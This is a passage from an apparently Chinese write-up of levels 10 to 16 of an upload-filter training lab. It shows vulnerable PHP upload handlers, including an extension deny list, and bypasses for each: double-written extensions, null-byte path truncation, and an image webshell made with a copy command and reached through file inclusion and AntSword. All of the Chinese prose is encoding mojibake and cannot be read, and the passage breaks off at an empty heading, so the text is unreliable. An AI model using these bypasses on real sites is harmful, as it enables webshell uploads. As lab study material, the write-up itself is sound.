<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>ä¸Šä¼ åç¼€åå°¾<code>1.php. .</code>å³å¯ã€‚</p>
<h4 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10(åŒå†™ç»•è¿‡)"></a><strong>Pass-10(åŒå†™ç»•è¿‡)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä»£ç æ²¡æœ‰äº†ä¹‹å‰å…³å¡é‡Œçš„å»é™¤æ–‡ä»¶å°¾ç‚¹ã€ç©ºæ ¼ã€<code>::$DATA</code>çš„æ“ä½œï¼Œä¼°è®¡æ˜¯é’ˆå¯¹éWindowsç³»ç»Ÿçš„ã€‚è¿™é‡Œæ˜¯åˆ©ç”¨äº†<code>str_ireplace</code>å¯¹é»‘åå•é‡Œçš„æ–‡ä»¶åç¼€åè¿›è¡Œäº†æ›¿æ¢ï¼Œæ¢æˆç©ºå­—ç¬¦ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>ç”¨burpä¿®æ”¹åç¼€åä¸º <code>.pphphp</code></p>
<h4 id="Pass-11-00æˆªæ–­get"><a href="#Pass-11-00æˆªæ–­get" class="headerlink" title="Pass-11(00æˆªæ–­get)"></a><strong>Pass-11(00æˆªæ–­get)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸ä¹‹å‰ä»£ç ç›¸æ¯”ï¼Œä½¿ç”¨äº†ç™½åå•ï¼Œåªå…è®¸ä¸Šä¼ <code>jpg</code>ï¼Œ<code>png</code>ï¼Œ<code>gif</code>ä¸‰ç§æ ¼å¼æ–‡ä»¶ã€‚</p>
<p>ä½†æ˜¯åœ¨è¿›è¡Œ<code>move_uploaded_file</code>å‰ã€‚åˆ©ç”¨<code>$_GET[&#39;save_path&#39;]</code>å’Œéšæœºæ—¶é—´å‡½æ•°è¿›è¡Œæ‹¼æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨æœ€ç»ˆå­˜å‚¨çš„æ–‡ä»¶åå¯æ§ã€‚æ•…å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œç»•è¿‡ã€‚</p>
<p>åˆ©ç”¨çš„æ˜¯00æˆªæ–­ã€‚å³<code>move_uploaded_file</code>å‡½æ•°çš„åº•å±‚å®ç°ç±»ä¼¼äºCè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ã€‚</p>
<p><strong>æˆªæ–­æ¡ä»¶ï¼š</strong></p>
<ul>
<li>phpç‰ˆæœ¬å°äº5.3.4</li>
<li>php.iniçš„<code>magic_quotes_gpc</code>ä¸ºOFFçŠ¶æ€</li>
</ul>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<img src="http://img.kawhi.xyz/image-20200503111752571.png" style="high:70%;width:70%;" />

<h4 id="Pass-12-00æˆªæ–­post"><a href="#Pass-12-00æˆªæ–­post" class="headerlink" title="Pass-12(00æˆªæ–­post)"></a><strong>Pass-12(00æˆªæ–­post)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒåŒæ ·æ˜¯ç™½åå•ã€‚</p>
<p>å’Œåä¸€å…³ä¸åŒçš„æ˜¯è¿™æ¬¡çš„<code>save_path</code>æ˜¯é€šè¿‡<code>post</code>ä¼ è¿›æ¥çš„ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œä½†è¿™æ¬¡éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸º<code>post</code>ä¸ä¼šåƒ<code>get</code>å¯¹<code>%00</code>è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<img src="http://img.kawhi.xyz/image-20200503113855012.png" style="high:70%;width:70%;" />

<h4 id="Pass-13-å›¾ç‰‡é©¬"><a href="#Pass-13-å›¾ç‰‡é©¬" class="headerlink" title="Pass-13(å›¾ç‰‡é©¬)"></a><strong>Pass-13(å›¾ç‰‡é©¬)</strong></h4><p>æºç æ˜¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); //åªè¯»<span class="number">2</span>å­—èŠ‚</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        case <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æè¿°ä¸ºï¼š</p>
<img src="http://img.kawhi.xyz/image-20200503161224229.png" style="high:70%;width:70%;" />

<p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶è¯»å–å…ˆè¯»å–ä¸¤å­—èŠ‚ï¼Œé€šè¿‡å¯¹æ¯”æ–‡ä»¶å¤´æ¥ç¡®è®¤æ–‡ä»¶ç±»å‹ã€‚äºæ˜¯å°±å¯ä»¥åˆ¶ä½œå›¾ç‰‡é©¬ï¼Œå°†phpè¯­å¥éšè—åœ¨å›¾ç‰‡ä¸­ï¼Œç„¶åç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œphpã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>åœ¨cmdå‘½ä»¤ä¸‹è¾“å…¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy <span class="number">1.</span>png /b + <span class="number">1.</span>php /a <span class="number">1.j</span>pg</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆå›¾ç‰‡é©¬åä¸Šä¼ ã€‚</p>
<p>ç„¶åæ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ã€‚è¿™é‡Œçš„åŸç†æ˜¯<code>include</code>å‡½æ•°ä¼šè¯•å›¾è§£æè¯»å–çš„å†…å®¹ï¼Œæ˜¯å¦ä¸ºphpä»£ç ï¼Œå¦‚è‹¥æ˜¯åˆ™æ‰§è¡Œï¼Œå¦åˆ™ç›´æ¥è¾“å‡ºã€‚</p>
<img src="http://img.kawhi.xyz/image-20200503161934822.png" style="high:90%;width:90%;" />

<p>å½“ç„¶é¡µé¢æ˜¯åªèƒ½çœ‹åˆ°å›¾ç‰‡çš„ä»£ç ï¼Œphpä»£ç æ˜¯çœ‹ä¸åˆ°çš„ã€‚</p>
<p>ç”¨èšå‰‘æµ‹è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸè¿æ¥ä¸Š</p>
<img src="http://img.kawhi.xyz/image-20200503162147838.png" style="high:90%;width:90%;" />

<h4 id="Pass-14-getimagesizeå›¾ç‰‡é©¬"><a href="#Pass-14-getimagesizeå›¾ç‰‡é©¬" class="headerlink" title="Pass-14(getimagesizeå›¾ç‰‡é©¬)"></a><strong>Pass-14(getimagesizeå›¾ç‰‡é©¬)</strong></h4><p>æºç ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†ä¸€ä¸ª<code>getimagesize()</code>å‡½æ•°è·å–æ–‡ä»¶çš„ç±»å‹ï¼Œç„¶åè®©<code>image_type_to_extension</code>å‡½æ•°è¿”å›æ–‡ä»¶çš„åç¼€å†è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>å’Œ13å…³ä¸€æ ·ã€‚</p>
<h4 id="Pass-15-exif-imagetypeå›¾ç‰‡é©¬"><a href="#Pass-15-exif-imagetypeå›¾ç‰‡é©¬" class="headerlink" title="Pass-15(exif_imagetypeå›¾ç‰‡é©¬)"></a><strong>Pass-15(exif_imagetypeå›¾ç‰‡é©¬)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //éœ€è¦å¼€å¯php_exifæ¨¡å—</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        default:</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯ä½¿ç”¨äº†<code>exif_imagetype</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æœ‰<code>IMAGETYPE_GIF</code>ï¼Œ<code>IMAGETYPE_JPEG</code>ï¼Œ<code>IMAGETYPE_PNG</code>ç­‰ç­‰ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>å’Œ13å…³ä¸€æ ·ã€‚</p>
<h4 id="Pass-16-äºŒæ¬¡æ¸²æŸ“"><a href="#Pass-16-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass-16(äºŒæ¬¡æ¸²æŸ“)"></a><strong>Pass-16(äºŒæ¬¡æ¸²æŸ“)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == false)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == false)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == false)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬åå…­å…³å…·ä½“å¯ä»¥å‚è€ƒï¼š<a class="foo" href="https://xz.aliyun.com/t/2657#toc-1" target="_blank">ä¼ é€é—¨</a></p>
<p><strong>åˆ†æä»£ç ï¼š</strong></p>
